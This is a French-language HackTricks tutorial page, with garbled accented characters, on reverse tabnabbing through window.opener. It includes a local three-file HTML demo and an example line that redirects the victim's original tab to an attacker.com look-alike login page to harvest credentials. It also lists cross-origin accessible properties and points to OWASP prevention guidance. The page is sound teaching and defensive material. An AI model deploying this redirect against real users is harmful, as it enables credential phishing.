<details>

<summary><strong>Apprenez le piratage AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Expert en √©quipe rouge AWS de HackTricks)</strong></a><strong>!</strong></summary>

Autres fa√ßons de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>


# Description

Dans une situation o√π un **attaquant** peut **contr√¥ler** l'argument **`href`** d'une balise **`<a`** avec l'attribut **`target="_blank" rel="opener"`** qui va √™tre cliqu√© par une victime, l'**attaquant** **redirige** ce **lien** vers un site web sous son contr√¥le (un **site web** **malveillant**). Ensuite, une fois que la **victime clique** sur le lien et acc√®de au site web de l'attaquant, ce **site web malveillant** pourra **contr√¥ler** la **page originale** via l'objet javascript **`window.opener`**.\
Si la page n'a pas de **`rel="opener"` mais contient `target="_blank"` et n'a pas `rel="noopener"`**, elle pourrait √©galement √™tre vuln√©rable.

Une fa√ßon courante d'exploiter ce comportement serait de **changer l'emplacement du site web d'origine** via `window.opener.location = https://attacker.com/victim.html` vers un site web contr√¥l√© par l'attaquant qui **ressemble √† l'original**, afin de **imiter** le **formulaire de connexion** du site web d'origine et de demander les identifiants √† l'utilisateur.

Cependant, notez que comme l'**attaquant peut maintenant contr√¥ler l'objet fen√™tre du site web d'origine**, il peut l'exploiter de diff√©rentes mani√®res pour effectuer des **attaques plus discr√®tes** (peut-√™tre en modifiant les √©v√©nements javascript pour exfiltrer des informations vers un serveur contr√¥l√© par lui ?)

# Aper√ßu

## Avec lien de retour

Lien entre les pages parent et enfant lorsque l'attribut de pr√©vention n'est pas utilis√© :

![https://owasp.org/www-community/assets/images/TABNABBING_OVERVIEW_WITH_LINK.png](https://owasp.org/www-community/assets/images/TABNABBING\_OVERVIEW\_WITH\_LINK.png)

## Sans lien de retour

Lien entre les pages parent et enfant lorsque l'attribut de pr√©vention est utilis√© :

![https://owasp.org/www-community/assets/images/TABNABBING_OVERVIEW_WITHOUT_LINK.png](https://owasp.org/www-community/assets/images/TABNABBING\_OVERVIEW\_WITHOUT\_LINK.png)

## Exemples <a href="#examples" id="examples"></a>

Cr√©ez les pages suivantes dans un dossier et ex√©cutez un serveur web avec `python3 -m http.server`\
Ensuite, **acc√©dez √†** `http://127.0.0.1:8000/`vulnerable.html, **cliquez** sur le lien et notez comment l'**URL du site web original** **change**.

{% code title="vulnerable.html" %}
```markup
<!DOCTYPE html>
<html>
<body>
<h1>Victim Site</h1>
<a href="http://127.0.0.1:8000/malicious.html" target="_blank" rel="opener">Controlled by the attacker</a>
</body>
</html>
```
{% endcode %}

{% code title="malicious.html" %}
```markup
<!DOCTYPE html>
<html>
<body>
<script>
window.opener.location = "http://127.0.0.1:8000/malicious_redir.html";
</script>
</body>
</html>
```
{% endcode %}

{% code title="malicious_redir.html" %}
```markup
<!DOCTYPE html>
<html>
<body>
<h1>New Malicious Site</h1>
</body>
</html>
```
{% endcode %}

## Propri√©t√©s accessibles <a href="#accessible-properties" id="accessible-properties"></a>

Dans le sc√©nario o√π un acc√®s **cross-origin** se produit (acc√®s entre diff√©rents domaines), les propri√©t√©s de l'instance de la classe JavaScript **window**, r√©f√©renc√©e par l'objet JavaScript **opener**, qui peuvent √™tre accessibles par un site malveillant sont limit√©es aux suivantes :

- **`opener.closed`** : Cette propri√©t√© est consult√©e pour d√©terminer si une fen√™tre a √©t√© ferm√©e, renvoyant une valeur bool√©enne.
- **`opener.frames`** : Cette propri√©t√© fournit l'acc√®s √† tous les √©l√©ments iframe dans la fen√™tre actuelle.
- **`opener.length`** : Le nombre d'√©l√©ments iframe pr√©sents dans la fen√™tre actuelle est renvoy√© par cette propri√©t√©.
- **`opener.opener`** : Une r√©f√©rence √† la fen√™tre qui a ouvert la fen√™tre actuelle peut √™tre obtenue via cette propri√©t√©.
- **`opener.parent`** : Cette propri√©t√© renvoie la fen√™tre parent de la fen√™tre actuelle.
- **`opener.self`** : L'acc√®s √† la fen√™tre actuelle elle-m√™me est fourni par cette propri√©t√©.
- **`opener.top`** : Cette propri√©t√© renvoie la fen√™tre du navigateur la plus en haut.

Cependant, dans les cas o√π les domaines sont identiques, le site malveillant obtient acc√®s √† toutes les propri√©t√©s expos√©es par la r√©f√©rence de l'objet JavaScript [**window**](https://developer.mozilla.org/en-US/docs/Web/API/Window).

# Pr√©vention

Les informations de pr√©vention sont document√©es dans la [Feuille de triche HTML5](https://cheatsheetseries.owasp.org/cheatsheets/HTML5\_Security\_Cheat\_Sheet.html#tabnabbing).

# R√©f√©rences

* [https://owasp.org/www-community/attacks/Reverse_Tabnabbing](https://owasp.org/www-community/attacks/Reverse_Tabnabbing)




<details>

<summary><strong>Apprenez le piratage AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres fa√ßons de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
